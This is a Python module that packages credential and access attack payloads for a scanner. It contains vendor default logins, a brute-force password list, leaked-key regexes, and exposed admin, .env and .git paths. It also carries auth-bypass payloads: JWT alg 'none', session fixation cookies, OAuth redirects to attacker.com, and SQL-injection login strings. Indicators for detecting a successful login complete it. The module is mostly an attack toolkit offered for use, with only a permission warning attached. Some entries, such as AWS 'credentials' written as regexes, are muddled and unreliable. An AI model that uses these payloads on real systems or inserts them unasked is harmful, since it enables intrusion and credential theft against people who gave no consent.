"""
Tier 1 Credential and Access Attack Payloads

This module contains common default credentials, weak passwords, API key patterns,
unsecured endpoints, and weak authentication bypass techniques for security testing
and vulnerability assessment purposes.

WARNING: Use only on systems you own or have explicit permission to test.
"""

import re
from typing import Dict, List, Set, Pattern


# ============================================================================
# DEFAULT CREDENTIALS ORGANIZED BY VENDOR/SERVICE
# ============================================================================

DEFAULT_CREDENTIALS: Dict[str, Dict[str, List[tuple]]] = {
    "databases": {
        "mysql": [
            ("root", ""),
            ("root", "root"),
            ("root", "password"),
            ("admin", "admin"),
        ],
        "postgresql": [
            ("postgres", "postgres"),
            ("postgres", "password"),
            ("admin", "admin"),
        ],
        "mongodb": [
            ("admin", ""),
            ("admin", "admin"),
            ("root", "root"),
        ],
        "redis": [
            ("", ""),  # No authentication required
            ("default", ""),
        ],
        "mssql": [
            ("sa", ""),
            ("sa", "sa"),
            ("admin", "admin"),
        ],
    },
    "cms": {
        "wordpress": [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "12345"),
        ],
        "drupal": [
            ("admin", "admin"),
            ("admin", "password"),
        ],
        "joomla": [
            ("admin", "admin"),
            ("admin", "password"),
        ],
        "mediawiki": [
            ("wikiuser", "wikiuser"),
        ],
    },
    "network": {
        "cisco": [
            ("admin", "cisco"),
            ("admin", "admin"),
            ("cisco", "cisco"),
        ],
        "fortinet": [
            ("admin", ""),
            ("admin", "fortinet"),
        ],
        "ubiquiti": [
            ("ubnt", "ubnt"),
            ("admin", "ubnt"),
        ],
        "mikrotik": [
            ("admin", ""),
            ("admin", "admin"),
        ],
    },
    "iot": {
        "generic_iot": [
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "1234"),
            ("admin", "password"),
            ("admin", "12345"),
            ("guest", "guest"),
        ],
        "hikvision": [
            ("admin", "12345"),
        ],
        "dahua": [
            ("admin", "admin"),
        ],
    },
    "cloud": {
        "aws": [
            ("AKIA.*", ".*"),  # AWS access key pattern
        ],
        "gcp": [
            ("default", ""),
        ],
        "azure": [
            ("admin@*.onmicrosoft.com", ".*"),
        ],
    },
    "web_services": {
        "tomcat": [
            ("tomcat", "tomcat"),
            ("admin", "admin"),
        ],
        "jenkins": [
            ("admin", "admin"),
        ],
        "splunk": [
            ("admin", "changeme"),
        ],
    },
}


# ============================================================================
# COMMON WEAK PASSWORDS (TOP 200 FROM BREACH DATA PATTERNS)
# ============================================================================

COMMON_PASSWORDS: List[str] = [
    # Numeric sequences
    "123456", "12345678", "123456789", "1234567890", "123123", "1234567",
    "12345", "1234", "123", "111111", "000000",
    
    # Simple words
    "password", "pass", "admin", "root", "test", "guest", "user", "login",
    "welcome", "hello", "abc123", "qwerty", "asdfgh", "zxcvbn",
    
    # Common names
    "admin", "administrator", "master", "manager", "operator", "user",
    
    # Keyboard patterns
    "qwerty", "qwertyuiop", "asdfghjkl", "zxcvbnm", "123456", "1qaz2wsx",
    "qweasd", "asdzxc", "qazwsx",
    
    # Year patterns
    "2023", "2024", "2022", "2021", "2020", "2019", "2018", "2017",
    "1234", "1111", "2222", "3333", "4444", "5555",
    
    # Common combinations
    "letmein", "welcome", "password123", "admin123", "root123", "test123",
    "welcome123", "admin@123", "password@123", "P@ssw0rd", "P@ssword",
    "pass123", "pass@123", "password1", "admin1", "root1", "test1",
    
    # Extended words
    "password!", "admin!", "root!", "password?", "admin123!", "root123!",
    "123456!", "qwerty!", "abc123!",
    
    # Common default patterns
    "default", "change", "changeme", "change_me", "toor", "pass",
    "secret", "secret123", "123secret", "password", "passwd",
    
    # Pattern variations
    "1234567", "12345678", "123456789", "1234567890", "1q2w3e4r",
    "qwe123", "123qwe", "asd123", "123asd", "zxc123", "123zxc",
    
    # Common phrases
    "iloveyou", "fuckyou", "trustno1", "monkey", "dragon", "master",
    "sunshine", "shadow", "freedom", "whatever", "mustang", "michael",
    
    # Repeated chars
    "aaaaaa", "bbbbbb", "cccccc", "dddddd", "eeeeee", "ffffff",
    "aaa", "bbb", "ccc", "ddd", "eee", "fff",
    
    # Additional weak patterns
    "admin@", "root@", "test@", "password!", "pass!", "admin!",
    "123", "456", "789", "000", "999", "888",
    "computer", "internet", "network", "system", "database",
    "batman", "superman", "spiderman", "starwars", "password",
    "football", "baseball", "basketball", "soccer", "hockey",
    "princess", "lovely", "princess123", "lovely123", "gorgeous",
    "superuser", "supervisor", "superadmin", "superpass", "supersecret",
    
    # More variations
    "admin1234", "root1234", "test1234", "guest1234", "user1234",
    "password12", "password123", "password1234", "password12345",
    "admin123", "admin1234", "admin12345", "admin123456",
    "root123", "root1234", "root12345", "root123456",
]


# ============================================================================
# API KEY PATTERNS (REGEX FOR DETECTING LEAKED KEYS)
# ============================================================================

API_KEY_PATTERNS: Dict[str, Pattern] = {
    "aws": re.compile(r"AKIA[0-9A-Z]{16}"),
    "aws_secret": re.compile(r"aws_secret_access_key\s*=\s*[a-zA-Z0-9/+=]{40}"),
    "github": re.compile(r"ghp_[a-zA-Z0-9]{36}"),
    "github_oauth": re.compile(r"gho_[a-zA-Z0-9]{36}"),
    "github_app": re.compile(r"ghu_[a-zA-Z0-9]{36}"),
    "stripe": re.compile(r"sk_live_[a-zA-Z0-9]{24}"),
    "stripe_test": re.compile(r"sk_test_[a-zA-Z0-9]{24}"),
    "google": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "google_oauth": re.compile(r"ya29\.[a-zA-Z0-9\-_]{20,}"),
    "slack": re.compile(r"xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}"),
    "slack_webhook": re.compile(r"https://hooks.slack.com/services/[a-zA-Z0-9/]+"),
    "digitalocean": re.compile(r"dop_v1_[a-zA-Z0-9]{48}"),
    "sendgrid": re.compile(r"SG\.[a-zA-Z0-9\-_]{22}"),
    "mailgun": re.compile(r"key-[a-zA-Z0-9]{32}"),
    "twilio": re.compile(r"AC[a-zA-Z0-9]{32}"),
    "mongodb": re.compile(r"mongodb\+srv://[a-zA-Z0-9:@/.?=_\-]+"),
    "firebase": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "heroku": re.compile(r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}"),
    "privkey_rsa": re.compile(r"-----BEGIN RSA PRIVATE KEY-----"),
    "privkey_openssh": re.compile(r"-----BEGIN OPENSSH PRIVATE KEY-----"),
    "jwt": re.compile(r"eyJ[a-zA-Z0-9_\-\.]+\.eyJ[a-zA-Z0-9_\-\.]+\.[a-zA-Z0-9_\-\.]+"),
}


# ============================================================================
# UNSECURED ENDPOINTS (COMMONLY EXPOSED ENDPOINTS)
# ============================================================================

UNSECURED_ENDPOINTS: Dict[str, List[str]] = {
    "admin_panels": [
        "/admin",
        "/wp-admin",
        "/administrator",
        "/admin.php",
        "/admin.html",
        "/manager",
        "/console",
        "/control",
        "/backend",
        "/dashboard",
        "/panel",
        "/phpmyadmin",
        "/cpanel",
        "/webmin",
    ],
    "debug": [
        "/debug",
        "/.env",
        "/env",
        "/phpinfo.php",
        "/server-status",
        "/server-info",
        "/status",
        "/health",
        "/ping",
        "/.git",
        "/.git/config",
        "/.gitconfig",
        "/.svn",
        "/.hg",
        "/CVS",
        "/web.config",
        "/config.php",
        "/database.yml",
        "/secrets.json",
    ],
    "api_docs": [
        "/swagger",
        "/swagger.json",
        "/swagger.yaml",
        "/api-docs",
        "/api/docs",
        "/graphql",
        "/graphiql",
        "/__schema",
        "/v1/docs",
        "/v2/docs",
        "/api/v1/docs",
        "/redoc",
        "/openapi.json",
    ],
    "actuators": [
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/actuator/configprops",
        "/actuator/metrics",
        "/metrics",
        "/health",
        "/info",
    ],
    "upload_endpoints": [
        "/upload",
        "/file/upload",
        "/media/upload",
        "/api/upload",
        "/v1/upload",
    ],
    "misc": [
        "/backup",
        "/download",
        "/export",
        "/logs",
        "/test",
        "/demo",
        "/example",
        "/old",
        "/new",
        "/tmp",
        "/temp",
        "/.well-known",
        "/robots.txt",
        "/sitemap.xml",
    ],
}


# ============================================================================
# WEAK AUTHENTICATION BYPASS PAYLOADS
# ============================================================================

WEAK_AUTH_PAYLOADS: Dict[str, Dict[str, any]] = {
    "jwt": {
        "algorithm_none": {
            "payload": '{"alg":"none","typ":"JWT"}',
            "description": "JWT algorithm set to 'none' to skip signature verification",
        },
        "weak_secret": {
            "secrets": ["secret", "password", "123456", "key", "jwt", ""],
            "description": "Common weak JWT secrets for brute force testing",
        },
        "expired_token_reuse": {
            "technique": "Attempt to use expired tokens in requests",
            "description": "Some implementations may not properly validate expiration",
        },
    },
    "session": {
        "fixation": {
            "payloads": [
                "Set-Cookie: SESSIONID=attacker_controlled_value",
                "Set-Cookie: PHPSESSID=123456789",
            ],
            "description": "Session fixation attack payloads",
        },
        "cookie_manipulation": {
            "techniques": [
                "Remove secure flag from cookie",
                "Remove httponly flag",
                "Modify cookie value",
                "Extend cookie expiration",
            ],
            "description": "Cookie manipulation techniques",
        },
    },
    "oauth": {
        "redirect_uri_manipulation": {
            "payloads": [
                "redirect_uri=http://attacker.com/callback",
                "redirect_uri=http://legitimate.com@attacker.com/callback",
                "redirect_uri=javascript:alert(1)",
            ],
            "description": "OAuth redirect URI manipulation payloads",
        },
        "state_bypass": {
            "technique": "Remove or modify state parameter",
            "description": "CSRF protection bypass via state parameter removal",
        },
    },
    "basic_auth": {
        "common_credentials": [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", ""),
            ("root", ""),
        ],
        "encoding": "base64",
        "description": "Base64 encoded common credentials for basic auth",
    },
    "sql_injection": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR 1=1 -- ",
            "admin' -- ",
            "' OR 'x'='x",
        ],
        "description": "SQL injection payloads for authentication bypass",
    },
}


# ============================================================================
# CREDENTIAL SUCCESS INDICATORS
# ============================================================================

CREDENTIAL_SUCCESS_INDICATORS: Dict[str, Dict[str, List[str]]] = {
    "http_status": {
        "success": ["200", "302", "303"],
        "redirect_auth": ["302", "303"],
        "failure": ["401", "403", "404", "500"],
    },
    "response_keywords": {
        "success": [
            "welcome",
            "dashboard",
            "logout",
            "profile",
            "settings",
            "authenticated",
            "authorized",
            "success",
            "logged in",
        ],
        "failure": [
            "unauthorized",
            "forbidden",
            "invalid",
            "incorrect",
            "login failed",
            "wrong",
            "denied",
            "not found",
        ],
    },
    "headers": {
        "success": [
            "Set-Cookie",
            "X-Authenticated",
            "Authorization",
        ],
        "failure": [
            "WWW-Authenticate",
        ],
    },
    "response_time": {
        "description": "Timing-based detection of valid vs invalid credentials",
        "technique": "Compare response times to identify credential validity",
    },
}


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_default_credentials(service_type: str = None, vendor: str = None) -> Dict:
    """
    Retrieve default credentials by service type and vendor.
    
    Args:
        service_type: Type of service (databases, cms, network, iot, cloud, web_services)
        vendor: Specific vendor/service name
        
    Returns:
        Dictionary of credentials matching the criteria
    """
    if service_type is None:
        return DEFAULT_CREDENTIALS
    
    if service_type not in DEFAULT_CREDENTIALS:
        return {}
    
    if vendor is None:
        return DEFAULT_CREDENTIALS[service_type]
    
    return {vendor: DEFAULT_CREDENTIALS[service_type].get(vendor, [])}


def search_api_keys(text: str) -> Dict[str, List[str]]:
    """
    Search text for potential API keys using regex patterns.
    
    Args:
        text: Text content to search
        
    Returns:
        Dictionary mapping key type to list of matches
    """
    results = {}
    for key_type, pattern in API_KEY_PATTERNS.items():
        matches = pattern.findall(text)
        if matches:
            results[key_type] = matches
    return results


def is_weak_password(password: str) -> bool:
    """
    Check if password matches common weak password patterns.
    
    Args:
        password: Password to check
        
    Returns:
        True if password is in common weak password list
    """
    return password.lower() in [p.lower() for p in COMMON_PASSWORDS]


def get_endpoint_by_category(category: str = None) -> Dict[str, List[str]]:
    """
    Get unsecured endpoints by category.
    
    Args:
        category: Endpoint category (admin_panels, debug, api_docs, etc.)
        
    Returns:
        Dictionary or list of endpoints
    """
    if category is None:
        return UNSECURED_ENDPOINTS
    
    return UNSECURED_ENDPOINTS.get(category, [])


__all__ = [
    "DEFAULT_CREDENTIALS",
    "COMMON_PASSWORDS",
    "API_KEY_PATTERNS",
    "UNSECURED_ENDPOINTS",
    "WEAK_AUTH_PAYLOADS",
    "CREDENTIAL_SUCCESS_INDICATORS",
    "get_default_credentials",
    "search_api_keys",
    "is_weak_password",
    "get_endpoint_by_category",
]
